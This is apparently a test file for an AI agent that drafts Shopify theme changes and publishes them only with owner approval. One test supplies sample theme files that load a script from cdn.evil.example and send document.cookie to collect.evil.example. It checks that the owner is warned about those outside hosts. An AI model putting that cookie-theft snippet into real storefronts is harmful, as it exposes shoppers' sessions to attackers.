import { fakeEngine, getAgent, listMemory, once, runAgent, updateAgent, type FakeStep, type ToolEnv } from '@frontline/agents';
import type { AgentEvent, ApprovalRequest } from '@frontline/shared';
import { beforeEach, expect, test } from 'vitest';
import { createApp } from '../app';
import { decide } from '../approvals';
import { addDays, localDate } from '../dates';
import { openDb, type Db } from '../db';
import { seedDemo } from '../demo';
import { getStore } from '../stores';
import { toolEnv } from './agents';
import { discardThemeCopy, draftThemeCopy, onDecision, publishThemeChange } from './agents-actions';
import { checkThemeOutcomes } from './agents-gamification';

let db: Db;
beforeEach(() => {
  db = openDb();
  seedDemo(db);
  createApp(db);
});
const tick = () => new Promise((r) => setImmediate(r));
const theme = (id: string, role = 'UNPUBLISHED', processing = false) => ({ id, name: `Theme ${id}`, role, processing, previewUrl: `https://glow.example/?preview_theme_id=${id}` });
type Themes = NonNullable<ToolEnv['themes']>;
const themes = (over: Partial<Themes> = {}): Themes => ({ list: async () => [theme('1', 'MAIN')], read: async () => [], draft: async (_, name) => ({ ...theme('9'), name }), remove: async () => {}, ...over });

async function run(steps: FakeStep[], env: Partial<ToolEnv> = {}, onEvent?: (e: AgentEvent) => void) {
  const out: string[] = [];
  const input = { agent: getAgent(db, 'glow:store_developer')!, store: getStore(db, 'glow')!, task: 't', env: { ...toolEnv(db), ...env } };
  for await (const e of runAgent(input, fakeEngine(() => steps))) {
    if (e.type === 'tool_result') out.push(e.output);
    onEvent?.(e);
  }
  return out;
}
const change = (extra: object = {}): FakeStep => ({
  call: 'draft_theme_change',
  input: {
    title: 'Sticky add-to-cart on mobile',
    summary: '62% of sessions are mobile and mobile ATC is 4.1% vs 6.3% on desktop.',
    files: [{ filename: 'sections/main-product.liquid', body: '<div class="sticky-atc">{{ product.title }}</div>' }],
    ...extra,
  },
});

test('draft_theme_change writes a copy of the live theme and asks to publish it with a preview; approval publishes it', async () => {
  const drafts: { name: string; files: unknown }[] = [];
  let request: ApprovalRequest | undefined;
  const [out] = await run([change()], { themes: themes({ draft: async (_, name, files) => (drafts.push({ name, files }), { ...theme('9'), name }) }) }, (e) => {
    if (e.type !== 'approval_request') return;
    request = e.approval;
    decide(db, e.approval.id, 'approve');
  });
  expect(drafts).toEqual([{ name: 'Frontline: Sticky add-to-cart on mobile', files: [{ filename: 'sections/main-product.liquid', body: '<div class="sticky-atc">{{ product.title }}</div>' }] }]);
  expect(request).toMatchObject({
    title: 'Publish theme change: Sticky add-to-cart on mobile',
    reason: expect.stringContaining('Preview: https://glow.example/?preview_theme_id=9 . Publishing makes the copy "Frontline: Sticky add-to-cart on mobile" the live theme'),
    action: { kind: 'store.publish_theme', payload: { themeId: '9', name: 'Frontline: Sticky add-to-cart on mobile', previewUrl: 'https://glow.example/?preview_theme_id=9', files: ['sections/main-product.liquid'] } },
  });
  expect(out).toMatch(/^Approved by the owner: Publish theme change: Sticky add-to-cart on mobile\. "Frontline: Sticky add-to-cart on mobile" goes live as the app publishes it/);
  await tick();
  // The executor ran: the demo store has no Shopify login, so the owner is told to publish it by hand.
  expect(db.prepare(`SELECT body FROM notifications WHERE title LIKE 'Couldn''t publish the theme on Glow Haus%'`).all()).toEqual([
    { body: 'Shopify is not connected for this store. Publish "Frontline: Sticky add-to-cart on mobile" by hand in Online Store > Themes.' },
  ]);
});

test("a theme change's request names the hosts outside Shopify its files load from", async () => {
  let reason = '';
  const files = [
    { filename: 'snippets/trust.liquid', body: '<script src="https://cdn.evil.example/x.js"></script><img src="//cdn.shopify.com/s/a.png">' },
    { filename: 'assets/atc.js', body: 'fetch("https://collect.evil.example/p?c=" + document.cookie); location = "https://glow-haus.myshopify.com/cart"' },
  ];
  await run([change({ files })], { themes: themes() }, (e) => {
    if (e.type !== 'approval_request') return;
    reason = e.approval.reason;
    decide(db, e.approval.id, 'deny');
  });
  expect(reason).toMatch(/^It loads from outside Shopify: cdn\.evil\.example, collect\.evil\.example\. 62% of sessions/);
  await run([change()], { themes: themes() }, (e) => e.type === 'approval_request' && ((reason = e.approval.reason), decide(db, e.approval.id, 'deny')));
  expect(reason).toMatch(/^62% of sessions/); // nothing outside: no warning
});

test('theme tools refuse what they should', async () => {
  db.prepare(`INSERT INTO approvals (id, store_id, agent_id, title, reason, action_json, status, created_at) VALUES ('t1', 'glow', 'glow:store_developer', 't', 'r', ?, 'pending', ?)`).run(
    JSON.stringify({ kind: 'store.publish_theme', payload: { themeId: '8' } }),
    new Date().toISOString(),
  );
  const env = { themes: themes({ read: async () => [{ filename: 'assets/base.css', content: 'x'.repeat(20_000) }, { filename: 'assets/logo.png', content: null }] }) };
  const out = await run(
    [
      change(),
      change({ files: [{ filename: 'layout/theme.liquid', body: 'x' }] }),
      change({ files: [{ filename: 'sections/../config/settings_data.json', body: 'x' }] }),
      { call: 'read_theme_files', input: { filenames: ['assets/*'] } },
    ],
    env,
  );
  expect(out[0]).toBe('Not sent: a theme change is already waiting for the owner. One at a time.');
  expect(out[1]).toContain('only sections/, snippets/, templates/, blocks/, assets/ or locales/ files');
  expect(out[2]).toContain('only sections/');
  expect(out[3]).toMatch(/^=== assets\/base\.css ===\nx{15000}\n… \(cut at 15,000 of 20000 characters\)\n\n=== assets\/logo\.png ===\n\(binary\)$/);

  db.prepare(`UPDATE approvals SET status = 'denied' WHERE id = 't1'`).run();
  // One went live 10 days ago: a second change inside its 14-day window can't be judged apart; after it, it can.
  db.prepare(`INSERT INTO approvals (id, store_id, agent_id, title, reason, action_json, status, created_at) VALUES ('t0', 'glow', 'glow:store_developer', 'Publish theme change: Bigger reviews', 'r', '{"kind":"store.publish_theme"}', 'approved', ?)`).run(new Date().toISOString());
  const live = new Date(Date.now() - 10 * 86_400_000);
  once(db, 'theme-live:t0', live);
  expect(await run([change()], env)).toEqual([
    `Not sent: the theme change "Bigger reviews" went live on ${live.toISOString().slice(0, 10)} and is judged on the 14 days of conversion after it. Put this one in your answer, or draft it once that window is over.`,
  ]);
  db.prepare(`UPDATE done_once SET at = ? WHERE ref = 'theme-live:t0'`).run(new Date(Date.now() - 16 * 86_400_000).toISOString());
  const failing = { themes: themes({ draft: async () => Promise.reject(new Error('Shopify: theme limit reached')) }) };
  expect(await run([change()], failing)).toEqual(['Not sent: Shopify: theme limit reached']);
  // Without an override, the demo store has no theme to edit.
  expect(await run([{ call: 'list_themes' }])).toEqual(['Theme editing needs a connected Shopify store; this one runs on demo data.']);
});

test('draftThemeCopy waits for Shopify to finish the copy before writing to it', async () => {
  const calls: string[] = [];
  let polls = 0;
  const copy = await draftThemeCopy(
    {
      list: async () => (calls.push('list'), [theme('1', 'MAIN'), theme('9', 'UNPUBLISHED', ++polls < 3)]),
      duplicate: async (id, name) => (calls.push(`duplicate ${id} ${name}`), { ...theme('9', 'UNPUBLISHED', true), name }),
      upsert: async (id, files) => (calls.push(`upsert ${id} ${files.length}`), files.map((f) => f.filename)),
      remove: async () => {},
    },
    'Frontline: test',
    [{ filename: 'sections/a.liquid', body: 'a' }],
    async () => {},
  );
  expect(calls).toEqual(['list', 'duplicate 1 Frontline: test', 'list', 'list', 'upsert 9 1']);
  expect(copy).toMatchObject({ id: '9', processing: false });
  await expect(draftThemeCopy({ list: async () => [theme('2')], duplicate: async () => theme('3'), upsert: async () => [], remove: async () => {} }, 'n', [], async () => {})).rejects.toThrow(
    'Shopify: the store has no live theme',
  );
});

test("a failed theme draft deletes its copy, and a 'suggest' agent copies nothing", async () => {
  const removed: string[] = [];
  const api = { list: async () => [theme('1', 'MAIN')], duplicate: async () => theme('9'), remove: async (id: string) => removed.push(id) };
  const files = [{ filename: 'sections/a.liquid', body: '{% if %}' }];
  await expect(draftThemeCopy({ ...api, upsert: async () => { throw new Error('Liquid syntax error'); } }, 'n', files, async () => {})).rejects.toThrow('Liquid syntax error');
  expect(removed).toEqual(['9']);

  let drafted = 0;
  updateAgent(db, 'glow:store_developer', { autonomy: 'suggest' });
  const out = await run([change()], { themes: themes({ draft: async () => (drafted++, theme('9')) }) });
  expect(drafted).toBe(0);
  expect(out).toEqual(['Not sent: your autonomy is "suggest". Put the change in your answer instead.']);
});

test('a copy made for a request that is then not sent is deleted', async () => {
  const removed: string[] = [];
  const out = await run([change()], {
    themes: themes({
      draft: async () => (updateAgent(db, 'glow:store_developer', { autonomy: 'suggest' }), theme('9')), // switched while it copied
      remove: async (storeId, id) => removed.push(`${storeId} ${id}`),
    }),
  });
  expect(out[0]).toMatch(/^Not sent: your autonomy is "suggest"/);
  expect(removed).toEqual(['glow 9']);
});

test('publishThemeChange publishes the approved copy', async () => {
  const published: string[] = [];
  const a = { id: 'a1', storeId: 'glow', agentId: 'glow:store_developer', title: 'Publish theme change: x', action: { kind: 'store.publish_theme', payload: { themeId: '9', name: 'Frontline: x' } } } as ApprovalRequest;
  await publishThemeChange(db, a, async (storeId, themeId) => published.push(`${storeId} ${themeId}`));
  expect(published).toEqual(['glow 9']);
  expect(db.prepare(`SELECT count(*) AS n FROM notifications WHERE title LIKE 'Couldn''t publish%'`).get()?.n).toBe(0);
});

test("a published theme change is judged on store conversion, 14 days before vs after, once, without Amazon's orders", async () => {
  db.prepare(`UPDATE stores SET demo = 0, connected = 1 WHERE id = 'glow'`).run();
  db.prepare(`INSERT INTO approvals (id, store_id, agent_id, run_id, title, reason, action_json, status, created_at) VALUES ('a1', 'glow', 'glow:store_developer', 'run-t', 'Publish theme change: Sticky ATC', 'r', ?, 'approved', ?)`).run(
    JSON.stringify({ kind: 'store.publish_theme', payload: { themeId: '9', name: 'Frontline: Sticky ATC' } }),
    new Date().toISOString(),
  );
  await publishThemeChange(db, { id: 'a1', storeId: 'glow', title: 'Publish theme change: Sticky ATC', action: { kind: 'store.publish_theme', payload: { themeId: '9' } } } as ApprovalRequest, async () => {});
  const day = addDays(localDate(), -20);
  db.prepare(`UPDATE done_once SET at = ? WHERE ref = 'theme-live:a1'`).run(`${day}T15:00:00Z`);
  const window = (from: number, to: number, orders: number, sessions: number) =>
    db.prepare(`UPDATE daily_metrics SET orders = ?, sessions = ? WHERE store_id = 'glow' AND date BETWEEN ? AND ?`).run(orders, sessions, addDays(day, from), addDays(day, to));
  window(-14, -1, 20, 1000); // 2.00%
  window(1, 14, 25, 1000); // 2.50%
  // Amazon as an extra channel adds 10 orders a day before (core's rebuild puts them in orders): not the theme's shoppers.
  db.prepare(`UPDATE daily_metrics SET orders = orders + 10 WHERE store_id = 'glow' AND date BETWEEN ? AND ?`).run(addDays(day, -14), addDays(day, -1));
  for (let d = -14; d <= -1; d++) db.prepare(`INSERT INTO channel_daily (store_id, channel, date, revenue, orders) VALUES ('glow', 'amazon', ?, 300, 10)`).run(addDays(day, d));
  const xp = getAgent(db, 'glow:store_developer')!.xp;
  checkThemeOutcomes(db);
  checkThemeOutcomes(db);
  expect(listMemory(db, 'glow').filter((m) => m.tags.includes('theme')).map((m) => m.text)).toEqual([
    'The theme change "Sticky ATC" worked: conversion 2.00% → 2.50% (14 days before vs after, 14,000 → 14,000 sessions).',
  ]);
  expect(db.prepare(`SELECT link FROM notifications WHERE title = 'Measured win: Store Developer'`).all()).toEqual([{ link: '/agents/glow:store_developer?tab=history' }]); // its XP line
  expect(getAgent(db, 'glow:store_developer')!.xp).toBeGreaterThan(xp);
});

test('a theme change on a store with a handful of orders is not judged on one order either way', async () => {
  db.prepare(`UPDATE stores SET demo = 0, connected = 1 WHERE id = 'glow'`).run();
  db.prepare(`INSERT INTO approvals (id, store_id, agent_id, run_id, title, reason, action_json, status, created_at) VALUES ('a1', 'glow', 'glow:store_developer', NULL, 'Publish theme change: Sticky ATC', 'r', ?, 'approved', ?)`).run(
    JSON.stringify({ kind: 'store.publish_theme', payload: { themeId: '9' } }),
    new Date().toISOString(),
  );
  const day = addDays(localDate(), -20);
  once(db, 'theme-live:a1', new Date(`${day}T15:00:00Z`));
  const window = (from: number, to: number, orders: number, sessions: number) =>
    db.prepare(`UPDATE daily_metrics SET orders = ?, sessions = ? WHERE store_id = 'glow' AND date BETWEEN ? AND ?`).run(orders, sessions, addDays(day, from), addDays(day, to));
  window(-14, -1, 0, 50);
  window(1, 14, 0, 50);
  db.prepare(`UPDATE daily_metrics SET orders = 1 WHERE store_id = 'glow' AND date IN (?, ?, ?)`).run(addDays(day, -3), addDays(day, 2), addDays(day, 3)); // 1 → 2 orders
  const xp = getAgent(db, 'glow:store_developer')!.xp;
  checkThemeOutcomes(db);
  expect(listMemory(db, 'glow').filter((m) => m.tags.includes('theme')).map((m) => m.text)).toEqual([
    `The theme change "Sticky ATC" can't be judged on 3 orders (it takes 30): conversion 0.14% → 0.29% (14 days before vs after, 700 → 700 sessions).`,
  ]);
  expect(getAgent(db, 'glow:store_developer')!.xp).toBe(xp);
  expect(db.prepare(`SELECT title FROM notifications WHERE title LIKE 'Store Developer:%'`).get()?.title).toBe('Store Developer: result unclear on too few orders');
});

test('a theme change is judged on the days with traffic reported, not orders from before GA4 was connected', async () => {
  db.prepare(`UPDATE stores SET demo = 0, connected = 1 WHERE id = 'glow'`).run();
  db.prepare(`INSERT INTO approvals (id, store_id, agent_id, run_id, title, reason, action_json, status, created_at) VALUES ('a1', 'glow', 'glow:store_developer', NULL, 'Publish theme change: Sticky ATC', 'r', ?, 'approved', ?)`).run(
    JSON.stringify({ kind: 'store.publish_theme', payload: { themeId: '9' } }),
    new Date().toISOString(),
  );
  const day = addDays(localDate(), -20);
  once(db, 'theme-live:a1', new Date(`${day}T15:00:00Z`));
  const window = (from: number, to: number, orders: number, sessions: number) =>
    db.prepare(`UPDATE daily_metrics SET orders = ?, sessions = ? WHERE store_id = 'glow' AND date BETWEEN ? AND ?`).run(orders, sessions, addDays(day, from), addDays(day, to));
  window(-14, -8, 20, 0); // no traffic data yet
  window(-7, -1, 20, 1000); // 2.00%
  window(1, 14, 25, 1000); // 2.50%
  checkThemeOutcomes(db);
  expect(listMemory(db, 'glow').filter((m) => m.tags.includes('theme')).map((m) => m.text)).toEqual([
    'The theme change "Sticky ATC" worked: conversion 2.00% → 2.50% (14 days before vs after, 7,000 → 14,000 sessions).',
  ]);
});

test("a denied theme draft's copy is deleted; a theme the app didn't make never is", async () => {
  const deleted: string[] = [];
  onDecision(db, 'denied', (_, a) => discardThemeCopy(db, a, async (storeId, themeId) => deleted.push(`${storeId} ${themeId}`)));
  const ask = db.prepare(`INSERT INTO approvals (id, store_id, agent_id, title, reason, action_json, status, created_at) VALUES (?, 'glow', 'glow:store_developer', 't', 'r', ?, 'pending', ?)`);
  ask.run('d1', JSON.stringify({ kind: 'store.publish_theme', payload: { themeId: '9', name: 'Frontline: x' } }), new Date().toISOString());
  ask.run('d2', JSON.stringify({ kind: 'store.publish_theme', payload: { themeId: '7', name: "The owner's summer theme" } }), new Date().toISOString());
  once(db, 'theme-copy:glow:9'); // draft_theme_change made 9
  decide(db, 'd1', 'deny');
  decide(db, 'd2', 'deny');
  await tick();
  expect(deleted).toEqual(['glow 9']);
});
